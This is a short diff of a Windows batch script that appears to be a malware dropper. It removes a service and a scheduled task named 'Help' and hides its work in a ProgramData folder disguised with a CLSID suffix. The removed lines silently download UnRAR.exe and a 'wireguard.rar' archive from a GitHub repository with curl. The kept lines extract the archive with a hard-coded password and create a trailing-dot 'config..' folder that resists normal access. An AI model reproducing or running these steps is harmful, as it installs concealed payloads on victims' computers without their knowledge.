@@ -1,10 +1,6 @@
 sc delete Help
 schtasks /Delete /TN "\Windows\Help" /F
 
-mkdir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
-dir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" >nul || curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" https://github.com/vltex/1/raw/1/r/UnRAR.exe
-dir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" >nul || curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" https://github.com/vltex/1/raw/1/r/wireguard.rar
-
 "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" x -y -o+ -p963258741 "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
 
 mkdir \\.\%ProgramData%\config..\
